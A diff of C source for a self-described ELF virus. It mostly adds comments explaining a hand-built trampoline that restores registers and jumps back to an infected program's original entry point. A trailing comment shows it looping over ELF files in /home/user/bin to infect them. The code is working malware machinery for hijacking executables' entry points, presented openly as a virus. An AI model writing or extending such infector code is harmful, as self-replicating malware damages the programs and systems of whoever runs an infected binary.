@@ -124,9 +124,12 @@ static inline void _memcpy(long src_addr, long dst_addr, long size)
 
 void _start(void)
 {
-	/* handle stack manually.... yes this is fight agains compiler :( */
 	__asm__ __volatile__ (
-		"add $0x2e8, %rsp\n"
+		/* handle stack manually.... yes this is fight agains compiler :( */
+		"add $0x2e8, %rsp\n" 
+		/* This is needed because if I don't do it,
+		 * then I will crash to glibc pointer protection.
+		 */
 		"pushq %rax\n"
 		"pushq %rbx\n"
 		"pushq %rdx\n"
@@ -134,6 +137,8 @@ void _start(void)
 		"pushq %rsi\n"
 		"pushq %rdi\n"
 		"pushq %rbp\n"
+
+		/* allocate spack space for virus */
 		"sub $0x2e8, %rsp\n"
 	);
 
@@ -154,8 +159,14 @@ void _start(void)
 	a[3] = 'a';
 	a[4] = '\0';
 
-	/* look at tail.asm file */
-	jmp[0] = '\x48';
+	/* Just one by one.. because this will be
+	 * translated to mov instructinos inside .text
+	 * section.
+	 * For more details, look at tail.asm.
+	 * PS: comments are in intel syntax assembly */
+
+	/* add rsp, size */
+	jmp[0] = '\x48'; 
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
 	jmp[3] = '\xe8';
@@ -163,14 +174,19 @@ void _start(void)
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
 
-	jmp[7] = '\x5d';
-	jmp[8] = '\x5f';
-	jmp[9] = '\x5e';
-	jmp[10] = '\x59';
-	jmp[11] = '\x5a';
-	jmp[12] = '\x5b';
-	jmp[13] = '\x58';
+	jmp[7] = '\x5d'; /* pop rbp */
+	jmp[8] = '\x5f'; /* pop rdi */
+	jmp[9] = '\x5e'; /* pop rsi */
+	jmp[10] = '\x59'; /* pop rcx */
+	jmp[11] = '\x5a'; /* pop rdx */
+	jmp[12] = '\x5b'; /* pop rbx */
+	jmp[13] = '\x58'; /* pop rax */
 
+	/* When process starts, entry point address are stored 
+	 * in r12 register. Because virus changes entry point address
+	 * original entry point address must be put back later. */
+
+	/* mov r12, 0x7777777777777777 */
 	jmp[14] = '\x49';
 	jmp[15] = '\xbc';
 	jmp[16] = '\x77';
@@ -182,8 +198,11 @@ void _start(void)
 	jmp[22] = '\x77';
 	jmp[23] = '\x77';
 
+	/* push r12 */
 	jmp[24] = '\x41';
 	jmp[25] = '\x54';
+
+	/* retq */
 	jmp[26] = '\xc3';
 
 	/* loop: for all elf files in /home/user/bin */
